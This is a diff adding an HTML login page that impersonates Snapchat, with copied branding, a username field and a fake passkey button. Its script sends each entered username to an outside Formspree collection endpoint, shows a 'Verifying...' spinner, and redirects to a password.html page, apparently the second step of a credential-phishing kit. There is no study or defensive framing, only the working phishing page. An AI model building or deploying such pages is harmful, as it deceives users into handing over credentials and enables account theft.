@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Snapchat Login</title>
+    <link rel="icon" href="https://yt3.googleusercontent.com/3LXX8rQiWxvIFLBcXEw1gNtE_nz6XDW_AdHN4J9zvzQz9u3_6MBPx8WhBeZ0d6uls0yVRMsl=s900-c-k-c0x00ffffff-no-rj">
+    <style>
+      :root {
+        --bg: #f7f7f7;
+        --card: #ffffff;
+        --border: #e5e5e5;
+        --text: #111111;
+        --muted: #5c636c;
+        --blue: #0daff0;
+        --blue-dark: #0a9ad6;
+        --shadow: 0 8px 20px rgba(0, 0, 0, 0.04);
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        min-height: 100%;
+        background: var(--bg);
+        color: var(--text);
+        font-family: Arial, Helvetica, sans-serif;
+      }
+
+      body {
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 24px 16px;
+      }
+
+      .login-card {
+        width: min(100%, 420px);
+        min-height: 540px;
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        box-shadow: var(--shadow);
+        padding: 22px 26px 24px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .ghost {
+        width: 64px;
+        height: 70px;
+        margin: 0 0 10px;
+        flex: none;
+        background: url("./images.png") center / 220% auto no-repeat;
+      }
+
+      h1 {
+        margin: 0 0 22px;
+        font-size: clamp(24px, 4vw, 32px);
+        line-height: 1.15;
+        font-weight: 600;
+        letter-spacing: -1px;
+        text-align: center;
+      }
+
+      .login-form {
+        width: 100%;
+      }
+
+      label {
+        display: block;
+        margin: 0 0 6px;
+        color: var(--muted);
+        font-size: 16px;
+        font-weight: 500;
+      }
+
+      input {
+        width: 100%;
+        height: 56px;
+        border: 2px solid #111111;
+        border-radius: 11px;
+        background: #ffffff;
+        color: var(--text);
+        padding: 0 14px;
+        font: inherit;
+        font-size: 16px;
+        outline: none;
+      }
+
+      input:focus {
+        box-shadow: 0 0 0 3px rgba(13, 175, 240, 0.18);
+      }
+
+      .next-button {
+        display: block;
+        min-width: 100px;
+        height: 48px;
+        margin: 14px auto 0;
+        padding: 0 24px;
+        border: none;
+        border-radius: 999px;
+        background: var(--blue);
+        color: #ffffff;
+        font: inherit;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: background 0.15s ease, transform 0.15s ease;
+      }
+
+      .next-button:hover {
+        background: var(--blue-dark);
+      }
+
+      .next-button:active {
+        transform: translateY(1px);
+      }
+
+      .next-button:focus-visible {
+        outline: 3px solid #0a7cb5;
+        outline-offset: 3px;
+      }
+
+      .separator {
+        width: 100%;
+        display: flex;
+        align-items: center;
+        gap: 16px;
+        margin: 22px 0 18px;
+        color: var(--muted);
+        font-size: 16px;
+      }
+
+      .separator::before,
+      .separator::after {
+        content: "";
+        height: 2px;
+        flex: 1;
+        background: #d9dce0;
+      }
+
+      .passkey-button {
+        width: min(100%, 330px);
+        min-height: 50px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        border: 1px solid #dedede;
+        border-radius: 999px;
+        background: #ffffff;
+        color: #111111;
+        font: inherit;
+        font-size: 16px;
+        cursor: pointer;
+      }
+
+      .key-icon {
+        width: 18px;
+        height: 18px;
+        flex: none;
+      }
+
+      .loading-screen {
+        position: fixed;
+        inset: 0;
+        background: rgba(255, 255, 255, 0.82);
+        display: none;
+        align-items: center;
+        justify-content: center;
+        flex-direction: column;
+        z-index: 999;
+      }
+
+      .spinner {
+        width: 48px;
+        height: 48px;
+        border: 5px solid #eaeaea;
+        border-top-color: var(--blue);
+        border-radius: 50%;
+        animation: spin 0.9s linear infinite;
+        margin-bottom: 16px;
+      }
+
+      @keyframes spin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      .loading-text {
+        font-size: 18px;
+        font-weight: 600;
+        color: var(--text);
+      }
+
+      @media (max-width: 520px) {
+        .login-card {
+          min-height: 500px;
+          padding: 18px 18px 20px;
+        }
+
+        .ghost {
+          width: 56px;
+          height: 62px;
+        }
+
+        input {
+          height: 52px;
+        }
+
+        .separator {
+          margin: 20px 0 16px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <main class="login-card">
+      <img class="site-logo" src="./new-Snapchat-logo-black-border-png-large-size.png" alt="Your site name logo">
+
+      <h1>Log in to Snapchat</h1>
+
+      <form id="login-form" class="login-form" action="https://formspree.io/f/xanpppwq" method="POST">
+        <input type="hidden" name="form_type" value="username for snapchat" />
+
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" autocomplete="username" required />
+
+        <button type="submit" class="next-button">Next</button>
+      </form>
+
+      <div class="separator" aria-hidden="true">OR</div>
+
+      <button class="passkey-button" type="button" aria-label="Sign in with a passkey">
+        <svg class="key-icon" viewBox="0 0 24 24" aria-hidden="true">
+          <path fill="currentColor" d="M14.5 3a6.5 6.5 0 0 0-6.2 8.5L2 17.8V22h4.2v-2.5h2.5V17h2.5l2.2-2.2A6.5 6.5 0 1 0 14.5 3Zm2.7 6.5a1.8 1.8 0 1 1 0-3.6 1.8 1.8 0 0 1 0 3.6Z"/>
+        </svg>
+        <span>Sign in with a passkey</span>
+      </button>
+    </main>
+
+    <div class="loading-screen" id="loading-screen" aria-live="polite" aria-label="Submitting form">
+      <div class="spinner" aria-hidden="true"></div>
+      <div class="loading-text">Verifying...</div>
+    </div>
+
+    <script>
+      document.addEventListener('DOMContentLoaded', function () {
+        const form = document.getElementById('login-form');
+        const loadingScreen = document.getElementById('loading-screen');
+
+        if (!form) return;
+
+        form.addEventListener('submit', function (event) {
+          event.preventDefault();
+
+          const username = form.username.value.trim();
+          if (!username) {
+            form.username.focus();
+            return;
+          }
+
+          if (loadingScreen) {
+            loadingScreen.style.display = 'flex';
+          }
+
+          const goToPasswordPage = function () {
+            window.location.href = 'password.html?username=' + encodeURIComponent(username);
+          };
+
+          fetch(form.action, {
+            method: form.method,
+            body: new FormData(form),
+            headers: {
+              Accept: 'application/json'
+            }
+          })
+            .catch(function (error) {
+              console.warn('Remote form submission unavailable, continuing locally:', error);
+            })
+            .finally(function () {
+              setTimeout(goToPasswordPage, 900);
+            });
+        });
+      });
+    </script>
+  </body>
+</html>
